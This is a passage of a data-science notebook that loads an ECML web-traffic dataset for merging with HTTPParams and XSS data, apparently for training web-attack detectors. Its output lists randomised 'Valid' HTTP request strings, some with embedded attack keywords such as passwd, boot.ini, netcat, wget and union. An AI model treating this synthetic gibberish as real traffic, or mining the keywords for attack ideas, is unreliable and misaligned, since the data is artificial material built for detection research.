# %% [markdown]
# # Merge and clean
#
# This notebook cleans datasets (ECML, HTTPParams and XSS) and finally merges them to one bigger dataset.

# %%
import json

# %%
with open('ECML.json', 'r') as f:
    ecml = json.load(f)

# %%
ecml
# Out:
# [{'type': 'Valid',
#   'request': 'crTeYreti=wsn&et3tf6shoV=tdsviee+y+fum%24oh3%3Bore&sAib5hfAvhEpC=tcilbrr+Lne',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.7', 'interval': None},
#  {'type': 'Valid', 'request': 'nhgiopIe/7.8.4.7.0', 'interval': None},
#  {'type': 'Valid',
#   'request': '/dyylkL.XD9cPu/4Ot0ta/ts6xNrP1/hssh/a2cuerht/sE8j00jiF@UbfX.77G/s0F/gt/5TsrstiuyvldFatrury.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/2m6VLb1r37jSPC/cWVv/Mbar/oqrd0/msc/etceebwgi/iO/m2zXMv/r@i98toR3YBbLcn.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'seivste3c=804252514&Gxnc1atstirc3eR=eA&ioe9ogl=%3B%7E&J7etc88Op=7%24gr+stx&HWlTW=c2.2mwQ&anE5=TAistyle&usi=la+&md=dNt%40&zs=%5Dt%7ChmEh',
#   'interval': None},
#  {'type': 'Valid', 'request': '/Soqdee/lDF.jpg', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.3', 'interval': None},
#  {'type': 'Valid',
#   'request': '/i4tBn0QTpvx/l6NstqM5eOe/rh-ELinsertPaTUC1bgsound/rh/dFwpV/thnosoZt6otNteic.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iTtoaQitnt=ftxe&eal=+%24optObaee%29rscriptcnid%3Bcc%29&pINfCoH8aMV1=6&84k=68&oPtrhlpc=i+&fnadtT9ao=sYjZp4Sf8&gem5neenha=3esgNemkuti',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'oenGtle0=8588;enlaapbsdsAJeet=auigutd;nRyo1Jctelnetx56Y=adt',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/xka2Yobgf79/ssx9sh6w31suat13a/ZkcDteam/XzlogAYw_processing-instructionyAJe/esiZX0r-aHTlMl/eHO7/-cee.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'lnhiznjhpahs=196053&aqgfubrieeaasid=rMtnhh%7CU+o',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/mBBRxrmqowGNHFNOFIQ/TtByTUAXOvz/eWkO/K7systemSsgPiE/a6dthmeEstHt/stwt4so/iierZIlgeAlOd_hOZfu/0eeqtzet/WatYvupdateRfk.dll',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'oejoabematban=8VEdeFIk;varV8LuLVFTvtmpU=ft-jk5Fc;naO3idu=60422;tyrkst3scrA2a=951;onSt3qa2iS=esm;TI.eXxsock_streamL=0U4b8t7NQ4Q',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'oejoabematban=8VEdeFIk;varV8LuLVFTvtmpU=ft-jk5Fc;naO3idu=60422;tyrkst3scrA2a=951;onSt3qa2iS=esm;TI.eXxsock_streamL=0U4b8t7NQ4Q',
#   'interval': None},
#  {'type': 'Valid', 'request': 'log1_j=5578340&9isor=execr', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Ce0MBesOTi4drop=g&d8ieiaiersT7o=tnr+d&eEt=shd&UDEcTeZUTB8Y=emC7mbw&nrd5sd7Hatsm=elOra&s97=45&eGcmmd=0&nN3s9s=rcso',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/qiame6tlaiyytbeceo/a.c8_x/nire0/9XeBPXVxqG2QkqkyoXN/aeHwPsba0ilctmabee/eA_1sSS1uC.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'rw2hitehtehaeo=eatar&9Lote0hto3as=sfpup%40&fhdnfNa=8&hse=rtlftnfwd4bhEnaasu&nhp8ap=%7Cbod&bgsoundAnxKcEUN=54&aemitataehxv=lTl9rFXIDxa&l7xnoSelei=leo%3Coe%3A%26graon&scniverce=i3itccopyg4fieeieZ&eRrrn=4&bYBkP=n%2Bbkfhm0cfesamittT+s&R@A_h=n%28uintcopyhC&ygo=65561774',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '4MvHXOJMoL2=tq+2rena&tgm=SX&6D=u1sqni2sh0oc&tl7=9782449&a6ncpE=tmpltctg%7CaCd%29group+by&mslh=sErteneee6ohgxws&fhvhpl0nn=ealf3Sae&8z@aYh.mwa=ili07Ryeeqeb&Hsrliteit5=06547&nnshu=684&1alr=rxO&OxOEpy-YltH7=drop&whm83=z7union&QdSXi3=1',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iot3rnidV=edrL%2Bry%3EyE%24a9&bLna9anodeF5rT=pS',
#   'interval': None},
#  {'type': 'Valid', 'request': '9teqdejf-tmhr', 'interval': None},
#  {'type': 'Valid',
#   'request': 'eydsrrIeehacrn=0;eexghzinhB=o3.5DCr8',
#   'interval': None},
#  {'type': 'Valid', 'request': '/w@A15le2/sKXn52apR8.cfm', 'interval': None},
#  {'type': 'Valid',
#   'request': 'eydsrrIeehacrn=0;eexghzinhB=o3.5DCr8',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/esz1suiEhyrds3t/Bgxp_/3_ERiOHwhere/dsfnhic/naqftganfdou/iInpTEGBXqrdZry/ojzGhUG4Y-2L1/5sRnhmthrtfmyio0jme/m_6RBm-eNP42y8bo8v/ilXHI.z5/aRBhFU1.msf',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/3.0 (X11; U; SunOS sun4u 9.3; 5t-ae; rv:8.6.2) Gecko/81213304',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/07xk/yyhfrcubwZNiipit/LhlIoeonf1nzuRmiH/tmeMIih4jenc1ys/DqhttpsXhUb/o@d/uq4n/tQ37SZs6LtgVO/yopch/2ofAl7shWdhjvC/iCrsnht8RRq/np1olau.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/gl/rFpQryo/EadrxeealsbioaatqR.sh',
#   'interval': None},
#  {'type': 'Valid', 'request': 'identity, identity;q=0.8', 'interval': None},
#  {'type': 'Valid',
#   'request': '/z1QpAXrla_Hur/dalaauihrc44riie2ner/uRcQv@b-ziEi/eadaesiawnhswe/rqFpLKB7a1HCn/@UpSwHevallUopen/ifLVBjx/iiMwV10j2htF7P/ljm5bO.TSeLTZ-BuZS/ln0Wz60Yd9DU.php4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '4euetOsn6ugs=nmn&oiisooTs0my=eVtdioesotfT&eT=ic&nq=l1l%28W&wstroemxzhssho=aIcu&i0resgh=jeftpaxr2eeadminehoehejipe&vFrmpSdallPGZm.=67&IgpTM4SNQw3l=sEDUA8uqT%40iL&iooabeu=t1F.sj5fyi%40A&eg=deletednfn&4eRrFjedjo=bFf0Fam',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'aedraOe=hDf&2@lQ6_=re%7Cii0srrreetv+9insert&emtaDd=75&rm=mem&nqdV=iH0Vzz&ceaa0xeslhewxao=40&eefbwetiq=yboot.ini&Imoan9hnwhar=28',
#   'interval': None},
#  {'type': 'Valid', 'request': '7ygxPEz2wcuri=eer+', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.3', 'interval': None},
#  {'type': 'Valid',
#   'request': 'taddrOcxytsetD=803;ysoUeSi=94057',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/n8kYtyRQcd8c79y/WdjndcTa4ajrfeIoia/o3ttIsReHesdsom2R7/yuKVJzgum_o/mochaAkorFkIS.UN/dBQ6y@CjksxLf_acR@J/cyiuektrlbndedn/IV5ebdohHr6rYeoaa/pTd_43xhGzpM6qWa72O/2doX1Hdn-w.mspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/vgtwtnitazbZkqg/pANsB9jGYr.B_umoYXDv/nNDwh_LdQtvKD/min2sn8b/Qusrwp-jzvbvQJg/k2D6PQ/dUPnCE5Yc/ers7nlsHeLusu/n-NM1_goGHO9oO.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/olrs8Efs0e/m51qA4imGzYGk2cZGaN/ajZIh3tTpm6Ug7jsu/c7Xnl0S/fhvKd6z1vdJv0oj/5t8DYfL/nebnlcoalaaERee652.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'EadGaoiidSrt4ne=tT9JEgbzh4IK&fzstw=sOKw7wIaa1&emehe=44727451&DPra=5267126&moqx=94814&di8snhyg6o2cm=817087&atjr=2264&E2LBrHohOa=ctxtermu&ceo=wpF&sNstdtf=aenqT',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'taddrOcxytsetD=803;ysoUeSi=94057',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'veju9kda=b-4S%409l%40JWh&3x5y=Rboot.ini&xneeAddcr=osooetcGn',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ma8t/dhuoruen/ti3sohe6psgwcslh.bin',
#   'interval': None},
#  {'type': 'Valid', 'request': '/tWSrx8AseEn.js', 'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid', 'request': 'n2t-Nosd;q=0.6', 'interval': None},
#  {'type': 'Valid', 'request': '/LlcAYlikeuRh.asmx', 'interval': None},
#  {'type': 'Valid',
#   'request': '/tU9/tsTobSG/wsrX9HJjVJ/uf.IYuTeVtp.exe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/nd.mkMcmWYnQw2Sw/lmmvtn/tnJstyleVu/Ta6han1i/0utdmte/n6nishiil7ltionmc/wxmlLtj0B@/orij/dj7F/e@dw/atrbzJF/nSfbiljHv.nsf',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/5.0 (X11; U; Linux i386 6.0; di-fi; rv:5.1.9) Gecko/38692357',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'fTpoelgr-qudE33, Dotm-eouEpe;q=0.3, ee-ilghdu;q=0.1, idl-Ar86n1u, sni-oejnfo;q=0.2',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/afRdwYL/sid@CAUJ6vg/auoes/uT/shttsqin7ccEtiercu4/mmihkxcn8ritqqesr/h04JwwRWb/etaslmj7wAiuhf.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'wcsd9yVztO http://www.hweet.com',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/7CB/2QdAN/bxn6xBljGj8eOxg-3lC/DBk.HOq/nectoDS3TetcmtmCt/tdjvQ2Uf/uxG7F@8@NzS6dCRuR6/ouigkV@DRvvoN/watv/aVE@Ea9zg3_o7sZcXv.htm',
#   'interval': None},
#  {'type': 'Valid', 'request': 'sond/7.3.8.1.1', 'interval': None},
#  {'type': 'Valid',
#   'request': '/hrtdAlce/lmy0N3@/tlFy4_Zo4M3IrOLw/.psBH4q7XuG4_@Ha/w7UqRVFbQd7Cd/lisa/FSN--Hehynpassthrui70/oUU/aO8r37mfbE0ai.cfm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eiyts=tt%7E%3Dxmlend&es2risat=tPY&aolaa8mrevte=1',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ETkYaiel7dthR/dnncAg6etoed/n5jmwoL7kIvoDM6/cgvAebin1Neval/dolwpntqa94tJtqbr/e1T93Eq/mst0e/uDu.cfm',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'yai4b-ieo;q=0.6, taNsMir-taEly1, oouHvuns-oeo;q=0.5, 7j1m-w;q=0.9, Raeae-efapl9rs;q=0.9',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Ky6nj=ya&tr5azer=352&teuc=tvheahosnonollon&qdhscnaLai=676225&reheiio=hZtrci&9sduszan=eaa&itenmr=4588889908&toqtcoi=449457975&Tm3eetwfbe=slrfi',
#   'interval': None},
#  {'type': 'Valid', 'request': '/w6D/adr8itimAnatj.jpg', 'interval': None},
#  {'type': 'Valid',
#   'request': 'saet3ua7=zMPlYV8t30ND&rsEi3t=betb&shie=83539640&esErmdot=14845&po3l=cot&ath8Tim=06023&_2YK@Va=402785&pub3tf=ocssrosS0d6HrmaWo&nulltfRAWU_F=45&te8la=Lexecmyetn%28hmtg&gFECDCEg_vo=hwoxbwatTs&6igaJibeana=5884',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/h3UR3JvP2CkT7/2f/enggehDN/uJWL1esuG/QpkNYvJCtmp/srx.php4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/saii/O9tiaoOinsert15stdinxml/Yao/agJG/npc4s3d/os@ou7MxE@bPG@sDZl/ts.exe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tURGHIdivGP2Y.Z1MO/eani0neo3Yh1tr3t/ex4r4qtrm/euathtsunPfO/glB9V3c/qmt5/uMH187Ch.exe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/0uKC/tCANVk_8SNZABAaYHgV/varTtDPuU@a/0bg_JkqzbZpymhI4/lroRniuscnfnl7taia/stzsdhuoctosodv5/HswfooDincs/g4kexo7eyhhvoE/eeisdtye6i4ngeAiok/A29Y3dJdGpasswd/nM9nSWbvmEYByvDG_ECB.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eo=eS%40dZBR3&g1eptet9sszr2td=4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/mt/ltnAeenaorll3esdntih/naVwWfHN/BRHwU46Zinput/fstyledeleteqeYZVwinntK77-.jpeg',
#   'interval': None},
#  {'type': 'Valid', 'request': '/6echo40Hdiv5W@6home.nsf', 'interval': None},
#  {'type': 'Valid',
#   'request': 'loy=txalliw+replacel&wan6Ms=0521487&copy-BxW4z46rm=fo%26positione%40Ydn%3Dtmpovar',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/rtbdp/yoLZPz/eSY5933dD4/td_6Al9BaiMP3bYA.sh',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/8.9 (X11; U; Solaris 2.5; dt-oh; rv:5.2.2) Gecko/85293618',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/6.2 (X11; U; Open BSD i386 9.7; et-le; rv:5.5.1) Gecko/27032415',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tLRcto.kOnZf4f1p/oAaXYN6Z3G/t8oyz6hqxoe/Qq5didEEpositionVFhp2/eE48W9D1mZ.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/Ed/sjand_.Uy65A_zhd/EeseazbIDhnh3a/g-qXyiHLOd9DP.html',
#   'interval': None},
#  {'type': 'Valid', 'request': '/Iaantmpn/otrmrtw.gif', 'interval': None},
#  {'type': 'Valid', 'request': 'psdlleyfsbh=icguk', 'interval': None},
#  {'type': 'Valid',
#   'request': 'mapnny=%2Bupdate&MRbk8PY=3864100&2v@cJo3E=ago&um=%27ee&hoaamdsuvhctT7=1127579&ehiFotiry=Se%245d',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/jO4union_wVsk09X_X/n6eet/2MuLH1n@4I/ndtasAcveNoa5pEa/rmbta9YE2D73/sTnndeEntdt8nsinoeo/r3DbPXpAXNZe4Xs.php',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'abtnewel-1se0;q=0.1, eRgmp-aserda',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/6.7 (Machintosh; U; PPC Mac OS X 1.7; fn-2e; rv:1.1.7) Gecko/31716481',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'dlfnEsrrs6ii=uMdtlmdgWC&yZliken4mstyleqUQ=9&trunionA1JXo=1&ae=669&7ltNehsraso=iaekgFioib&enieonetao=91440658&positiondeletePBiscriptPrpasswdPZD=2hej%5D&2aAegne0=c5e6uL&na6oBree=otha&aegruoruTe4wjg=hone',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'hosarojaile=tzg&nshcr=74&Oiiaerh=h71x0&ulmtr=Nh2%3B+%27dti',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ae7cdrntoee=passwd0sysr0s&.yJBKy@gK2=nadidgsd&TSnNcm=0938&titaecejus=AigieojbeaI&naPaaai=eoiaoseeoetsdF&8ftemeynat8ery=processing-instruction9%3C&tnl2a=Rc2&cdeoStraUr=43330&iess3enhikD4da=80805&eeOrdN9oa=745&rhdzdiraraaI=4769',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'nr-o;q=0.8, cefh9ex-t;q=0.8, mo-roWt;q=0.9',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'thie2juwiIenish=9hkiw5;texqe=eiYrite',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'uGrrTrfo (2rZ5H4ZYik; amG-dXhLKm)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'identity, gzip, compress, compress, gzip',
#   'interval': None},
#  {'type': 'Valid', 'request': 'toaauriri/5.7.3.8.5', 'interval': None},
#  {'type': 'Valid',
#   'request': '/fPQ/eekefnmwtt/uCrahre/sDDMA-_qrQLd.bin',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/0ett5wCsllNb5naa4e/iframeAeY3QZJD2S_eval/eBdjDb5xcJH/e3n_ZsIF2CShnEMOo9.pl',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/t4ZJjvAF/5XeVLB.gsm1cwpOI/kzzNZy/gwrqhpdedLemtsq/4PR86v8TKP3Vh_RP/1HDBC-GX9FG/vLfgvWEnlH_AzyuG/t8noQdo/em/ta1hi2iglOsomeep/sklkt/rzethiTeenve1y.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ynetcatqF=%25%404e;wutit5raaoi=netcAnFtoantshutdownih',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/nrKK.YAxkWYs74/y9zegut7ngnc.jpeg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'pa=DawmfH&68=ueratiacceptm&smsclrc=rspscdoritnpcreo&huefSfsiezshl=%28no&oriNbcztan=1Wy-6FC3&sembTraXa=elhnrraf0mat&mOandVtnn4lee=in&coraapgo8nsspte=6%2FIer8dc+sseswud&CA9a=osewtsYsru7fi&Wtnfiupqnmalce=526932&fsr1ifllo=19&eciemmagiyvasos=ux%40ATgWrA2wq&EvHa=e0ours&ozsdNonTu=725904&Oamth=e+eH',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Oezaeps=786;mirltaie=myh1v6oy;k93xsoiny=31436;di=9636425;vAlitebcD6t=uZI',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.5', 'interval': None},
#  {'type': 'Valid', 'request': 'ueloodle20=7ecwCsty0nNngnS', 'interval': None},
#  {'type': 'Valid',
#   'request': '/A0TNAuxg/ThtiyHt9aaBToEd/i6tX3FZhSLsT1ZZIH4/sNarbhdljmeUos/jTWrsw7@6.dcrZpFu/ekI7raeSi/ku.msf',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'seesifehc=%7Eettiohlweopeni%27&keei=zt&Iscprhimdogzeo=rrne&jaccess_log.mGFLZDdJY=89048310&k9sehsoiGqg=EiR+e7aU%27-Dt&eshQzcenLea2dso=b%27%2Fna&aOnf9ws7n7e=e&l9coaywr=applf8n&LyEacceptt88=3wSnseztZ&sme=352843&sam8J8_K=Dgw&jcQF2z8Mn=13315222',
#   'interval': None},
#  {'type': 'Valid', 'request': 'ueloodle20=7ecwCsty0nNngnS', 'interval': None},
#  {'type': 'Valid',
#   'request': '/Dulnuoipe/uamSLxS3/asnneoeey.html',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/6.0 (compatible; MSIE 3.1; Windows NT; hrzsAm)',
#   'interval': None},
#  {'type': 'Valid', 'request': 'rl-Ler, iITi-el9thcwd;q=0.2', 'interval': None},
#  {'type': 'Valid',
#   'request': '/i7eBRZb/listhuurflal5w/biowhs3/oic8AEyte2Pqcb/aaqqzV.6zyaTnx/io.8GC31c/eaohotofvyle/nrtfihrtrrsnyi/KNp/3sOsh.php3',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eie=e4ee%7C9rdt%3Eewexectelnetlio&qDteaqhshoxdpbe=74822935&ilyro=c+Nae9o&4wzhgrtStmo=ddrop3&szfio=8&USjcg.n=ebtInnsi&sRcotyoeoq1or=r6-UoSmC1z&ishplS=nApiuPFfpv',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'tz96doi=e3.bGTZ%40B7a&bfuIocdhBrpl=5.BcWP&EjdLdivQq=1881248863&etEdjs=9a&ssi7s=ur&Zc_94p1X3mC=pX4sgC73',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/3.7 (X11; U; Linux i586 8.8; ms-nn; rv:5.3.4) Gecko/45951631',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'hdAhTiaRhkp2s=aesal&6oshvhiaRei=nBivyNWC_&rySrg7jaEOa8a=bjtN1tseamtpaSlp&HyPnQM1=ieyrest1n&tirss=asaprocessing-instruction&a6eg5o1epetldta=Pcat%27rqea%5BL%271nt%3Ce+r&nmns5b0knkr=0trtelnet&ordeiii=e9dRtihacbwuej&arL6cUcua=owhere&%ujko=gqbtUx39EJW2&sr=48540&q9lnaoidm=nse+union98cic&oFrhseajotrlnj=gz9aeaayiframe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ixOxdpV9X/kgkCDLt78QvxRWt/tyhA/liKlezngf4/hKREcmdyp.msf',
#   'interval': None},
#  {'type': 'Valid', 'request': 'reto-c;q=0.4', 'interval': None},
#  {'type': 'Valid', 'request': 'shat=nt+M%5C%29poh+e', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.4', 'interval': None},
#  {'type': 'Valid',
#   'request': 'giiiezh7=%24Al%3AhslDLSrig&ss=boot.inidrop',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/2.7 (Windows; U; WinNT 8.6; ar-g2; rv:6.7.2) Gecko/03193712',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/GAVuM-yZ/tG.EtqyICvB1Ih/xW/betlayt/iskT6lTNejo.html',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/otbPL/anHoSFVFi.nJ0vk/tChTUp5wWIr/563XPogqV3J5CKxb/na/wzghhKU/obA2xXCGO8c5/yFpSUHaj0HY0D/JIYbgsoundvTVm_/i-8VnYPiz3rc7tHP.jpeg',
#   'interval': None},
#  {'type': 'Valid', 'request': 'shat=nt+M%5C%29poh+e', 'interval': None},
#  {'type': 'Valid',
#   'request': '/connect0scriptkXCinU0h0J@bf/8VU2TX7Mwe@PXPX7OP.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tlkvovHI3AZT67eFv/ibtettapjrl8smlnode.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/7.3 (Machintosh; U; PPC 9.9; ns-to; rv:0.5.9) Gecko/89332409',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 't4lemi7r-edacdi2;q=0.1, Liedj9It-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'interval': None},
#  {'type': 'Valid', 'request': '/eEnihhlsstethg.cgi', 'interval': None},
#  {'type': 'Valid', 'request': '/FA0c/nUTb0X.asp', 'interval': None},
#  {'type': 'Valid',
#   'request': 't4lemi7r-edacdi2;q=0.1, Liedj9It-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'lzSmaE3mtaewr=fta%24w+icN%3Doesohb+sls;Oab6d=mim',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'dCy@G7.o http://www.tHrRf.de',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iyeiloa (3gQQYHo_; iESkyL@S; dV-y92n; sD0aDgsY7p)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ethe2o=Asn;y0asjep3faf=92338064;eo8eb=3syeeeojUdEze1',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.1', 'interval': None},
#  {'type': 'Valid', 'request': 'ter=snph-', 'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': '/vmIgzttnHijt/nt6rrv9e/uic6TIgWc/XBk/oon/bsztuYlrehne53/nynshdo6nux/tmtcdpt/z2boot.inihttpaW/lec2.jpeg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'txr3tazfha06=o%283r9iusrgHt%27aioeeirg&exuiiislbers8eh=6_H&ni9rlcmethut=oeqosn5en&rdebrihirmgysn=m&HwX5iVt-1j=%3F+nh&f3lsiS=01881940&omaea05rnSf=e695oorm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eNekTshtzwPrrOe/tJnL-At7C6/es_.pVpyZom_s/aB2rbbsMGLN-Fz9S5a/e3wn/r@8eqlEQ/access_logX2null2aTnF/eNPqsWKlu/qOxph/at1h5i8bOariilbod/u8XqNnv/uH.UG.kPiScCKnn63-..tiff',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.9', 'interval': None},
#  {'type': 'Valid',
#   'request': 'ss=998&n92texcirR9t=zDUUZQG2a6Bs&raniyutopeatca8=64117&rthior1rw=96062&asizp0d=4&zhbztitye0ho=8832010&ljE9L7a=47807&er5Cq9qtb=3a7eraObT1&doh=s+6tyoslortno3s&eppct=zeeTeedoe&Q4PufpYNA=aVrl&oaeantqaazpdi=8310',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/lrst/1a5r/gq9vhE0aSm5em/aJY/hfyDkl6nqobMv.js',
#   'interval': None},
#  {'type': 'Valid', 'request': 'Woya=lc1q_ti.La', 'interval': None},
#  {'type': 'Valid',
#   'request': '/sPBK51V/iIcopy-F_4XphpLTmailczp/e_qHoTdwcN4x3iw257V.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'CSi9e=732973&u6QmaeaRty=eh5r0b&qhsphS35iheaeu=775614966&Sx@qsxp_NFm85=73817&36xtermJYG8m9UK5=4&shf9fb6wsa=rM-atwn4V&deehh=m2doos&y9ltrnfeurne=95021&aChhshirsn=%29r+nc0formhrhi%3Cc&qfxW-bWXUNw=3',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/cnseguo3iiagath/etBcmvgn59Zf4M_SCsQ/n90Wak/eum.uegQTt@Z0.pl',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ovIn/u4RrbtutamlicnnoW9r/hr9teuinfiLal7resh/t0Vb/xtermJmR/brs8u/dea6e8lehe4itnsovad/notHZqRJg0a3lr/sQRWPc98yEOG/2kL/bjk2ISYformN.js',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ey7gesmbou=21306170&H@andZjh=a&oecc2t84sam1dh=in2&ieph=rmu1awaindocumentecho+includekvnoa%3Eo&1WqBN6f085O3=692426&nbaertntaq=yui70tifYA1ocss&bNo=615395&ssa9s4Nc=cnH&oqqdilpeg=oZc&sGqy9pD6RM5=otcwuag&lghilIenZd9rton=O3tyDwoz&eyrNnr9eeuaaron=idibadmini%7EDe%26lf%29ri%25eo%3A&oZEhSgori=ezfsoiTale4&veichEatideo=ohOxbman',
#   'interval': None},
#  {'type': 'Valid', 'request': '/W3/hchatkinf.gif', 'interval': None},
#  {'type': 'Valid', 'request': 'irse-gnW, ebF-cnArNe', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/1.0 (Machintosh; U; PPC Mac OS X 1.1; so-ry; rv:4.9.6) Gecko/17805427',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/al/nlnl2/eut/isIAxOOXo@h8HAX2N/ooO/tm/ij4wmV-/hb/bIdXG6MA@mD3rSgd.js',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/NU9U_3a_UXG/r22btXyPNGhsYm/hgeszecl36or.shtml',
#   'interval': None},
#  {'type': 'Valid', 'request': 'Neroiod9eto6Nit=a8j', 'interval': None},
#  {'type': 'Valid',
#   'request': '/uzOdMWG0w04EB/tlem/piaitLt0swn/UX3yP7xtermrZL5R/eI2V4yI/eno1I3Tuf_CQn583Grav/tha1dcuse/GGyb4opt.fpyhomef.jpeg',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': 'oiddotlxitkoypd=4268941708', 'interval': None},
#  {'type': 'Valid',
#   'request': '/OSOmunode/entagtdierbhoilHnETi/IAZSovz/ftirn/Ttus2a9s.aspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'bxyrRayaona=vo&tsieocOlrno=xtermto%2B&egv=+tiy%3C%5Dkt+ntsTOdi7i&yqoibncp2tsoh=925&ei=90985&eSKGWwget=676258&od9cnt=54738375&nnn=y&l0cugnsre=%2Bbcat%3Ds5htoaeta0&mtastajsdn=in&9Jj6CMcDMJincludev=%3Ae5flac%3Cp%29h&Is4NeserihAOhr=enioe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/7.6 (Windows; U; Win98 7.0; tr-nw; rv:2.3.3) Gecko/57190452',
#   'interval': None},
#  {'type': 'Valid', 'request': 's8n00l http://www.kgey.com', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.7', 'interval': None},
#  {'type': 'Valid',
#   'request': '/Te6oAee1euesesluc54r/uk0@VptzOchtaccessro/yBfo66__Nqf4GjaIHK/lnYMBVioK/oyPHnd/Xxmlba/tet2ntsN7ahhmeE/csi.js',
#   'interval': None},
